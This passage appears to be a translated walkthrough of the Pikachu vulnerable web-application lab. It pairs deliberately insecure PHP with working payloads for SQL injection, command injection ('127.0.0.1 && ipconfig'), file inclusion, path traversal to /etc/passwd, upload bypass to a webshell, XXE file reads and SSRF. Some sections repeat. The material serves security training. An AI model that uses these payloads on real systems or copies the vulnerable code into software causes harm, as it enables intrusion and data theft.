     $name=$_GET['name'];//There is no processing here, and it is directly spelled into the select
     $query="select id,email from member where username='$name'";//The variable here is a character type, which needs to be closed
     //mysqi_query does not print the error description, even if there is injection, it is not easy to judge
     $result=mysqli_query($link, $query);//
// $result=execute($link, $query);
     if($result && mysqli_num_rows($result)==1){
         while($data=mysqli_fetch_assoc($result)){
             $id=$data['id'];
             $email=$data['email'];
             $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
         }
     }else{

         $html.="<p class='notice'>The username you entered does not exist, please re-enter!</p>";
     }
}
exploit

Main performance based on boolean blind injection:

1. No error message
2. Regardless of whether it is a correct input or a wrong input, only two cases are displayed (we can think of it as 0 or 1)
3. Under the correct input, enter and 1=1/and 1=2 and find that it can be judged
Steps for Manual Blind Injection

1. Determine whether there is an injection, whether the injection is a character or a number
2. Guess the current database name
3. Guess the table name in the database
4. Guess the field name in the table
5. Guess the data
Note: Here 123 is the user I created, maybe it was admin, check the data in the database by yourself

payload: 123' and 1=1 # There is a result returned indicating that it is a character type

payload: 123' and length(database())=7 # There are results, the database name is 7 characters

The following is the normal blind injection library explosion steps, abbreviated

Blind (base_on_time)
Server-side core code$_POST['password']!=null){
// $getdata=escape($link, $_POST);//escape

         //No escaping, resulting in an injection vulnerability, the operation type is insert
         $getdata=$_POST;
         $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),' {$getdata['sex']}', '{$getdata['phonenum']}', '{$getdata['email']}', '{$getdata['add']}')";
         $result=execute($link, $query);
         if(mysqli_affected_rows($link)==1){
             $html.="<p>Successful registration, please return <a href='sqli_login.php'>login</a></p>";
         } else {
             $html.="<p>Registration failed, please check if the database is still alive</p>";

         }
     }else{
         $html.="<p>Required items cannot be empty</p>";
     }
}
exploit
  
In the above search-type injection, it demonstrates that the select class reports an error to obtain information, and insert and update are actually similar

Test the insert injection first, enter ' on the registration page to view the observation of the back-end feedback, and learn that the submitted content has participated in splicing in the background by observing the error report.



Version 1' or updatexml(1,concat(0x7e,(version())),0) or'')#

Table name 1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0) or'')#



The old rules, the number after changing the limit

Field name 1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0) or'')#



The old rules, the number after changing the limit

Data 1' or updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) or'')#



Data 1' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or'')#



Test update below

Server-side core code

if(isset($_POST['submit'])){
     if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
// $getdata=escape($link, $_POST);

         //Unescaped, form injection, sql operation type is update
         $getdata=$_POST;
         $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email ='{$getdata['email']}' where username='{$_SESSION['sqli']['username']}'";
         $result=execute($link, $query);
         if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
             header("location:sqli_mem.php");
         } else {
             $html1.='Modification failed, please try again';

         }
     }
}
exploit

Version 1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = <Note!!! Here is your username>;#

For example mine: 1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = 123;#





The rest is a little bit behind, I'm tired

"delete" injection
Server-side core code

// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
// Did not process the incoming id, resulting in DEL injection
if(array_key_exists('id', $_GET)){
     $query="delete from message where id={$_GET['id']}";
     $result=execute($link, $query);
     if(mysqli_affected_rows($link)==1){
         header("location:sqli_del.php");
     }else{
         $html.="<p style='color: red'>Delete failed, check if the database is down</p>";
     }
}
exploit

Capture packet GET /pikachu/vul/sqli/sqli_del.php?id=1 HTTP/1.1

Parameter id can try sql error injection to construct payload

1 or updatexml(1,concat(0x7e,database()),0)

Convert the replacement ID through URL conversion encoding that comes with Burp Suite





Slightly behind

"http_header" injection
Server-side core code

if(isset($_GET['logout']) && $_GET['logout'] == 1){
     setcookie('ant[uname]','',time()-3600);
     setcookie('ant[pw]','',time()-3600);
     header("location:sqli_header_login.php");
}
?>
exploit



After logging in, go to Burp to find the login GET request, send the request to the Repeater module, remove User-Agent:, then enter 's and then run it to observe the MYSQL syntax error and find that there is a SQL injection vulnerability.



Burst database name payload: firefox' or updatexml(1,concat(0x7e,database ()),0) or '



Slightly behind

Blind (base_on_boolian)
Blind injection means that in the process of sql injection, after the selection of sql statement execution, the error data cannot be echoed to the front page (the error message shielding method is used in the background to block the error report). When sql injection cannot be performed through the returned information, use Some methods to judge the length of the table name, the length of the column name and other data, and then the process of blasting out the database data is called blind injection.

Server-side core code

if(isset($_GET['submit']) && $_GET['name']!=null){
     $name=$_GET['name'];//There is no processing here, and it is directly spelled into the select
     $query="select id,email from member where username='$name'";//The variable here is a character type, which needs to be closed
     //mysqi_query does not print the error description, even if there is injection, it is not easy to judge
     $result=mysqli_query($link, $query);//
// $result=execute($link, $query);
     if($result && mysqli_num_rows($result)==1){
         while($data=mysqli_fetch_assoc($result)){
             $id=$data['id'];
             $email=$data['email'];
             $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
         }
     }else{

         $html.="<p class='notice'>The username you entered does not exist, please re-enter!</p>";
     }
}
exploit

Main performance based on boolean blind injection:

1. No error message
2. Regardless of whether it is a correct input or a wrong input, only two cases are displayed (we can think of it as 0 or 1)
3. Under the correct input, enter and 1=1/and 1=2 and find that it can be judged
Steps for Manual Blind Injection

1. Determine whether there is an injection, whether the injection is a character or a number
2. Guess the current database name
3. Guess the table name in the database
4. Guess the field name in the table
5. Guess the data
Note: Here 123 is the user I created, maybe it was admin, check the data in the database by yourself

payload: 123' and 1=1 # There is a result returned indicating that it is a character type

payload: 123' and length(database())=7 # There are results, the database name is 7 characters

The following is the normal blind injection library explosion steps, abbreviated

Blind (base_on_time)
Server-side core code

  
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理,直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型,需要考虑闭合
    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述
//     $result=execute($link, $query);
//    $html.="<p class='notice'>i don't care who you are!</p>";
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
            $html.="<p class='notice'>i don't care who you are!</p>";
        }
    }else{

        $html.="<p class='notice'>i don't care who you are!</p>";
    }
}
  
exploit

If the parameter of id is passed to the code layer, a \ will be added before ’. Due to the URL encoding adopted, the effect is %df%5c%27

The key is here, %df will eat %5c to form a new byte, for example, %d5 will eat %5c when it encounters %5c, and form %d5%5c, this code will be decoded by the code Form a Chinese character "Cheng"

Because of the relationship between %df, the encoding %5c of \ is eaten, and the effect of escaping is lost, and it is directly brought into mysql, and then mysql ignores the new byte formed by %a0%5c when interpreting. Then the single quotes come into play again

  This author writes hints just like TM, too unfriendly

Test payload: lili%df' or 1=1 #

Test payload: lili%df%27%20or%201=1%23

Burst library payload: lili%df' union select user(),database() #

Burst table payload: lili%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #



Slightly behind
RCE
The RCE vulnerability allows attackers to directly inject operating system commands or codes into the background server remotely to control the background system. Generally, this kind of vulnerability occurs because the application system needs to provide users with a specified interface for remote command operations from the design

For example, on the web management interface of our common routers, firewalls, intrusion detection devices, etc.

Generally, a web interface for ping operation will be provided to the user. The user inputs the target IP from the web interface. After submission, the background will perform a ping test on the IP address and return the test result. However, if the designer completes the function , without strict security control, it may cause the attacker to submit "unexpected" commands through this interface, so that the background can be executed, thereby controlling the entire background server

exec_"ping"
Server-side core code

if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
     $ip=$_POST['ipaddress'];
// $check=explode('.', $ip); You can split it first, and then check the number to range, the first and fourth digits are 1-255, and the middle two digits are 0-255
     if(stristr(php_uname('s'), 'windows')){
// var_dump(php_uname('s'));
         $result.=shell_exec('ping '.$ip);//Directly splicing variables in without processing
     } else {
         $result.=shell_exec('ping -c 4 '.$ip);
     }
}
exploit

You can splice the commands you want to execute

payload: 127.0.0.1 && ipconfig
payload: 127.0.0.1 & ipconfig
payload: 127.0.0.1 | ipconfig


exec_"eval"
Server-side core code

if(isset($_POST['submit']) && $_POST['txt'] != null){
     if(@!eval($_POST['txt'])){
         $html.="<p>The characters you like are quite strange!</p>";
     }
}
eval(phpcode)

The eval() function evaluates a string as PHP code.

The string must be valid PHP code and must end with a semicolon.

Returns NULL if no return statement was called in the code string. The eval() function returns false if there is a parsing error in the code.

exploit

If the background does not process the input, then we enter a php code: phpinfo(); , it will execute the code directly instead of returning the correct window



File_Inclusion
File inclusion is a function. Built-in file inclusion functions are provided in various development languages, which allow developers to directly include (introduce) another code file in a code file. For example, in PHP, it provides:

include(), include_once()
require(), require_once()
In most cases, the code file included in the file inclusion function is fixed, so there will be no security issues. However, sometimes, the code file included in the file is written as a variable, and this variable can be passed in by the front-end user , in this case, if you do not take enough security considerations, it may cause a file inclusion vulnerability. The attacker will designate an "unexpected" file for the execution of the inclusion function, resulting in malicious operations. According to different configuration environments, There are two types of file containment vulnerabilities:

Local file inclusion vulnerability: Only local files on the server can be included. Since the files on the server cannot be controlled by the attacker, in this case, the attacker will include some fixed system configuration files, thus reading Fetch system sensitive information. In many cases, local file inclusion vulnerabilities will be combined with some special file upload vulnerabilities to form greater power.
Remote file inclusion vulnerability: remote files can be included through the url address, which means that the attacker can pass in arbitrary code.
Therefore, in the functional design of the web application system, try not to allow front-end users to directly pass variables to the containing function. If you have to do this, you must also implement a strict whitelist policy for filtering.

The local file contains
Server-side core code

if(isset($_GET['submit']) && $_GET['filename']!=null){
     $filename=$_GET['filename'];
     include "include/$filename";//The variable is passed in and included directly, without any security restrictions
// //Safe way of writing, use a whitelist, strictly specify the file name included
// if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || $filename=='file4.php' || $filename =='file5.php'){
// include "include/$filename";

// }
}
exploit

View the url of the page: http://<server IP!!!>/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&submit=submit

Try to construct payload: http://<server IP!!!>/pikachu/vul/fileinclude/fi_local.php?filename=../../../test/phpinfo.txt&submit=%E6%8F%90% E4%BA%A4

The remote file contains
Set allow_url_include to On

Server-side core code
  
//远程文件包含漏洞,需要php.ini的配置文件符合相关的配置
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "$filename";//变量传进来直接包含,没做任何的安全限制
}
  
exploit

Try to construct payload: http://<server IP!!!>/pikachu/vul/fileinclude/fi_remote.php?filename=http://<server B IP!!!>/phpinfo.php&submit=%E6%8F% 90%E4%BA%A4

Unsafe_Filedownload
The file download function will appear on many web systems. Generally, when we click the download link, a download request will be sent to the background. Generally, this request will contain a file name to be downloaded. After receiving the request, the background will start to execute the download code. , and send the file response corresponding to the file name to the browser to complete the download. If the background receives the requested file name and directly puts it into the path of the downloaded file without making a security judgment on it, it may cause Insecure file download vulnerability.

At this time, if the attacker submits a carefully constructed path (such as ../../../etc/passwd) instead of the expected file name of a program, it is very likely that the specified file will be directly Download it. As a result, background sensitive information (password files, source code, etc.) will be downloaded.

Therefore, when designing the file download function, if the downloaded target file is passed in by the front-end, you must consider the security of the passed-in file. Remember: all data interacting with the front-end is not safe and should not be taken lightly!

exploit

Construct payload: http://<server IP!!!>/pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/config.inc.php

Unsafe_Fileupload
The file upload function is very common in web application systems. For example, many websites need to upload avatars, upload attachments, etc. when registering. When the user clicks the upload button, the background will judge whether the uploaded file is the specified type, suffix name, size, etc., and then rename it according to the designed format and store it in the specified directory. If the background does not make any security judgments on the uploaded files or the judgment conditions are not strict enough, the attacker may upload some malicious files , such as a Trojan horse, which causes the background server to be blocked by webshell.

Therefore, when designing the file upload function, we must strictly consider the security of the incoming files. For example:

Verify file type, extension, size;
Verify how the file was uploaded;
Some complex renaming of files;
Do not expose the path after file upload;
etc...
client_check
Server-side core code

if(isset($_POST['submit'])){
// var_dump($_FILES);
     $save_path='uploads';//Specify to create a directory in the current directory
     $upload=upload_client('uploadfile',$save_path);//call function
     if ($upload['return']){
         $html.="<p class='notice'>File uploaded successfully</p><p class='notice'>The path to save the file is: {$upload['new_path']}</p>";
     }else{
         $html.="<p class=notice>{$upload['error']}</p>";
     }
}
exploit

It is said that only picture files are allowed to be uploaded, then check the front-end code, when the page changes, the checkFileExt function will be called to check whether the uploaded picture is a picture



Here you can change the file to the suffix name of the picture first, then capture the package and modify the suffix to upload



MIME_type
What is MIME

In the earliest HTTP protocol, there was no additional data type information, and all transmitted data was interpreted by the client program as a hypertext markup language HTML document. In order to support multimedia data types, the HTTP protocol used MIME attached before the document. Data type information to identify the data type.

MIME means Multipurpose Internet Mail Extensions. Its original purpose is to attach multimedia data when sending emails, so that mail client programs can process them according to their types. However, when it is supported by the HTTP protocol, its meaning becomes more It is notable. It makes HTTP transmission not only ordinary text, but also rich and colorful.

Each MIME type consists of two parts, the front is a large category of data, such as sound audio, image image, etc., and the latter defines the specific type.

Common MIME Types

HTML text .html,.html text/html
plain text .txt text/plain
Rich Text Text .rtf application/rtf
GIF graphics .gif image/gif
JPEG graphics .ipeg,.jpg image/jpeg
au sound file .au audio/basic
MIDI music files mid, .midi audio/midi, audio/x-midi
RealAudio music files .ra, .ram audio/x-pn-realaudio
MPEG files .mpg, .mpeg video/mpeg
AVI file .avi video/x-msvideo
GZIP file .gz application/x-gzip
TAR file .tar application/x-tar
There is a special organization in the Internet, IANA, to confirm the standard MIME type, but the Internet is developing too fast, and many applications cannot wait for IANA to confirm that the MIME type they use is a standard type. So they use the method starting with x- in the category Marking this category has not yet become a standard, such as: x-gzip, x-tar, etc. In fact, these types are widely used and have become the de facto standard. As long as the client and server recognize this MIME type, even if it is not standard It does not matter the type of MIME, the client program can use specific processing methods to process data according to the MIME type. In the Web server and browser (including the operating system), standard and common MIME types are set by default. For uncommon MIME types, it is necessary to set both the server and client browsers for identification.

Since the MIME type is related to the suffix of the document, the server uses the suffix of the document to distinguish the MIME type of different files, and the corresponding relationship between the document suffix and the MIME type must be defined in the server. When the client program receives data from the server, it It just accepts the data stream from the server and does not know the name of the document, so the server must use additional information to tell the client program the MIME type of the data. Before sending the real data, the server must first send the MIME type information of the marked data. Information is defined using the Content-type keyword. For example, for an HTML document, the server will first send the following two lines of MIME identification information. This identification is not part of the real data file.

Content-type: text/html

Note that the second line is a blank line, which is necessary. The purpose of using this blank line is to separate the MIME information from the real data content.

Server-side core code

if(isset($_POST['submit'])){
// var_dump($_FILES);
     $mime=array('image/jpg','image/jpeg','image/png');//Specify the MIME type, here is just to judge the MIME type.
     $save_path='uploads';//Specify to create a directory in the current directory
     $upload=upload_sick('uploadfile',$mime,$save_path);//call function
     if ($upload['return']){
         $html.="<p class='notice'>File uploaded successfully</p><p class='notice'>The path to save the file is: {$upload['new_path']}</p>";
     }else{
         $html.="<p class=notice>{$upload['error']}</p>";
     }
}s
exploit

Here, upload a picture and a txt text respectively, use burp to capture packets, and observe two different Content-Types respectively

Content-Type: image/jpeg
Content-Type: text/plain
Here, change the Content-Type of txt to the Content-Type of the picture, test and upload successfully



getimagesize
Server-side core code

if(isset($_POST['submit'])){
     $type=array('jpg','jpeg','png');//Specify the type
     $mime=array('image/jpg','image/jpeg','image/png');
     $save_path='uploads'.date('/Y/m/d/');//Generate a folder according to the date of the day
     $upload=upload('uploadfile','512000',$type,$mime,$save_path);//call function
     if ($upload['return']){
         $html.="<p class='notice'>File uploaded successfully</p><p class='notice'>The path to save the file is: {$upload['save_path']}</p>";
     }else{
         $html.="<p class=notice>{$upload['error']}</p>";

     }
}
exploit

Here you can use file inclusion + file header spoofing for getshell

Make a picture horse copy 11111.png/b+1.php/a shell5.png

burp forward upload
  
Ant Sword Connection



Over_Permission
If the authority of user A is used to operate the data of user B, the authority of A is less than the authority of B, and if the operation can be successfully performed, it is called an unauthorized operation. of.

Generally, privilege violation vulnerabilities are easy to appear in the place where the authority page (page that needs to be logged in) is added, deleted, modified, and checked. When the user performs these operations on the information in the authority page, the background needs to verify the authority of the current user. See if it has the authority to operate, so as to give a response, and if the verification rules are too simple, it is easy to have an overreach vulnerability. Therefore, in authority management, you should abide by:

Use the principle of least privilege to empower users;
Use reasonable (strict) permission verification rules;
Use the background login status as a condition to judge permissions, don't just use the conditions passed in from the front end
Horizontal overreach
exploit

Observe the link and find that the user name is submitted through the URL. You can directly modify the user name in the URL to access the information of other users

vertical override
exploit

Log in with admin, create an account 123456, then log out, log in with pikachu, forward the previous request to create account 123 in burp, use pikachu's cookie to overwrite the previous admin's cookie, you can find that 123 has been created repeatedly



directory traversal
In the design of web functions, we often define the files that need to be accessed as variables, so that the front-end functions can be more flexible. When the user initiates a front-end request, the value of the requested file (such as file name) to the backend, and the backend executes the corresponding file. During this process, if the backend does not take strict security considerations on the values passed in from the front end, the attacker may use ../ to make the backend open Or execute some other files. As a result, the results of files in other directories on the background server are traversed, forming a directory traversal vulnerability.

Seeing this, you may think that directory traversal vulnerabilities have similar meanings to unsafe file downloads, or even file inclusion vulnerabilities. Yes, the main reason for the formation of directory traversal vulnerabilities is the same as the two, both in functional design It is caused by passing the file to be operated to the background using variables in the method without strict security considerations, but the phenomenon shown in the position where it appears is different. Therefore, it is still defined here separately.

What needs to be distinguished is that if you list all the files in the doc folder through a url without parameters (for example: http://xxxx/doc), in this case, we become a sensitive information leak. It does not belong to for directory traversal vulnerabilities.

exploit

payload: http://<IP address !!!>/pikachu/vul/dir/dir_list.php?title=../../../../../../../../ ../1.txt



linux payload: http://<IP address !!!>/pikachu/vul/dir/dir_list.php?title=../../../../../../../.. /../etc/passwd

Sensitive Information Leakage
Due to the negligence of background personnel or improper design, data that should not be seen by front-end users is easily accessed. For example:

By accessing the directory under url, you can directly list the files in the directory;
After entering the wrong url parameter, the error message contains the version of the operating system, middleware, development language or other information;
The front-end source code (html, css, js) contains sensitive information, such as the background login address, intranet interface information, and even account passwords;
Similar to the above situations, we have become sensitive information leaks. Although sensitive information leaks have always been rated as relatively low-harm vulnerabilities, these sensitive information often provide great help for attackers to carry out further attacks, and even "outrageous" sensitive information Leakage will also directly cause serious losses. Therefore, in the development of web applications, in addition to safe code writing, it is also necessary to pay attention to the reasonable handling of sensitive information.

exploit

Direct F12 to view the source code



PHP deserialization
Before understanding this vulnerability, you need to understand the two functions serialize() and unserialize() in php.

Serialize serialize()

In layman's terms, serialization is to turn an object into a string that can be transmitted. For example, the following is an object:

<?php
class S{
     public $test="pikachu";
}
$s=new S(); //Create an object
serialize($s); //Serialize this object
print_r(serialize($s));
?>

The result after serialization looks like this: O:1:"S":1:{s:4:"test";s:7:"pikachu";}
     O: stands for object
     1: The length of the object name is one character
     S: the name of the object
     1: means there is a variable in the object
     s: data type
     4: The length of the variable name
     test: variable name
     s: data type
     7: The length of the variable value
     pikachu: variable value
Deserialize unserialize()

It is to restore the serialized string to an object, and then continue to use it in the next code.

$u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
echo $u->test; //The result is pikachu
There is no problem with serialization and deserialization itself, but if the content of deserialization is controllable by the user, and the magic function in PHP is improperly used in the background, it will lead to security problems

Several common magic functions:

__construct() is called when an object is created

__destruct() is called when an object is destroyed

__toString() is used when an object is treated as a string

__sleep() runs on the object before it is serialized

__wakeup will be called immediately after serialization
Vulnerability example:

class S{
     var $test = "pikachu";
     function __destruct(){
         echo $this->test;
     }
}
$s = $_GET['test'];
@$unser = unserialize($a);

payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
Server-side core code

class S{
     var $test = "pikachu";
     function __construct(){
         echo $this->test;
     }
}

if(isset($_POST['o'])){
     $s = $_POST['o'];
     if(!@$unser = unserialize($s)){
         $html.="<p>Big brother, let's have some fun!</p>";
     }else{
         $html.="<p>{$unser->test}</p>";
     }

}
exploit

First, you need to define a variable in PHP, write the variable as a malicious code and serialize it, access the written php file and view the source code, copy the serialized code as the payload

Online deserialization tool: https://www.w3cschool.cn/tools/index?name=unserialize

payload: O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}



Return to the platform to submit the payload and a pop-up window will be triggered



XXE
What are XML external entities

If you know XML, you can understand XML as a tool used to define data. Therefore, two systems using different technologies can communicate and exchange data through XML. For example, the following figure is a tool used to describe an employee Sample XML document where 'name', 'salary', 'address' are called XML elements.



Some XML documents contain "entities" defined by system identifiers, which are rendered in DOCTYPE header tags. These defined 'entities' can access local or remote content. For example, the following XML document sample contains XML 'entity'.



In the above code, the XML external entity 'entityex' is given the value: file://etc/passwd. In the process of parsing the XML document, the value of the entity 'entityex' will be replaced by the URI (file:// etc/passwd) content value (that is, the content of the passwd file). The keyword 'SYSTEM' will tell the XML parser that the value of the 'entityex' entity will be read from the URI following it. Therefore, the number of times the XML entity is used The more, the more helpful.

XXE

XXE - "xml external entity injection" is "xml external entity injection vulnerability". With XML entities, the keyword 'SYSTEM' will cause the XML parser to read the content from the URI and allow it to be replaced in the XML document. Therefore , the attacker can send his custom value to the application through the entity, and then let the application render it. In simple terms, the attacker forces the XML parser to access the resource content specified by the attacker (maybe a local file on the system or or a file on a remote system). For example, the following code will fetch the contents of folder/file on the system and present it to the user.



To sum it up, "the attacker injects the specified xml entity content into the server, so that the server executes according to the specified configuration, causing problems", that is to say, the server receives and parses the xml data from the client without doing strict security controls, resulting in xml external entity injection.

Server-side core code

if(isset($_POST['submit']) and $_POST['xml'] != null){
     $xml = $_POST['xml'];
// $xml = $test;
     $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
     if ($data) {
         $html.="<pre>{$data}</pre>";
     }else{
         $html.="<p>Do you understand the XML declaration, DTD document type definition, and document elements?</p>";
     }
}
exploit

Enter paylaod, the set value will pop up

<?xml version = "1.0"?>
<!DOCTYPE note [
     <!ENTITY hacker "admin">
]>
<name>&hacker;</name>


payload, please make sure that the target path has this file
  
<?xml version = "1.0"?>
<!DOCTYPE note [
<!ENTITY aaa SYSTEM "file:///c:/1.txt">]>
<name>&aaa;</name>
  
Under linux, you can also enter such a payload

<?xml version = "1.0"?>
<! DOCTYPE ANY [
     <!ENTITY f SYSTEM "expect://ifconfig">
]>
<x>&f;</x>
URL redirection
The problem of unsafe url redirection may occur in all places where url address redirection is performed.

If the backend uses the parameters passed in from the frontend (maybe user parameters, or the url address pre-embedded in the frontend page) as the jump destination, and no judgment is made

The problem of "jumping the wrong object" may occur.

The more direct harm of url redirection is: Phishing, that is, the attacker uses the domain name of the vulnerable party (for example, a relatively well-known company domain name often allows users to click on it with confidence) to cover up, and the final redirection is indeed a phishing website, the general process Yes, jump to vulnerability --> phishing page --> submit username and password --> jump back

Server-side core code

if(isset($_GET['url']) && $_GET['url'] != null){
     $url = $_GET['url'];
     if($url == 'i'){
         $html.="<p>Okay, I hope you can stick to being yourself!</p>";
     } else {
         header("location:{$url}");
     }
}
exploit

payload: http://<IP address !!!>/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com

SSRF
Most of the reasons for its formation are that the server provides the function of obtaining data from other server applications, but does not strictly filter and limit the target address, so that the attacker can pass in any address to let the back-end server initiate a request to it , and return the data requested by the target address

Data flow: attacker----->server---->target address

Depending on the functions used in the background, the corresponding impact and utilization methods are different

Improper use of the following functions in PHP can cause SSRF:

file_get_contents()
fsockopen()
curl_exec()
If it is necessary to make a resource request to the address specified by the user ("or a request embedded in the front end") remotely through the background server, please filter the target address.

SSRF(curl)
Server-side core code

if(isset($_GET['url']) && $_GET['url'] != null){
     //It's okay to receive the front-end URL, but filter it well, if you don't filter it, it will lead to SSRF
     $URL = $_GET['url'];
     $CH = curl_init($URL);
     curl_setopt($CH, CURLOPT_HEADER, FALSE);
     curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
     $RES = curl_exec($CH);
     curl_close($CH) ;
//The question of ssrf is: the url passed in by the front end is requested by the background using curl_exec(), and then the result of the request is returned to the front end.
//In addition to http/https, curl also supports some other protocols curl --version can view the supported protocols, telnet
//curl supports many protocols, including FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE and LDAP
     echo $RES;
}
Extended reading: Use CURL to implement GET and POST requests in PHP

exploit

Observe url: http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php

It looks like a remote inclusion vulnerability, try to construct payload: http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com



There are many ways to use SSRF, the more common one is that the server requests other websites, one is to detect sensitive information on the intranet, and the other is to attack web applications, mainly through trust2 remote command execution, and some middleware getshell.

payload: http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/1.txt

payload: http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:80/info



SSRF(file_get_content)
Server-side core code

if(isset($_GET['file']) && $_GET['file'] !=null){
     $filename = $_GET['file'];
     $str = file_get_contents($filename);
     echo $str;
}
file_get_contents() function

The file() function reads the entire file into an array. Same as file(), except that file_get_contents() reads the file into a string.

The file_get_contents() function is the preferred method for reading the contents of a file into a string. If supported by the operating system, memory mapping is also used to enhance performance.

exploit

Observe url: http://<IP address !!!>/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php

Looks like nothing changed, try constructing payload: http://<IP address !!!>/pikachu/vul/ssrf/ssrf_fgc.php?file=http://www.baidu.com

payload: http://<IP address !!!>/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/1.txt
